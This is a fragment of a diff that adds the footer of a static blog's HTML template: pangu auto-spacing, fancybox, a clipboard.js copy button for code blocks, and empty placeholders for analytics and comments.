+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
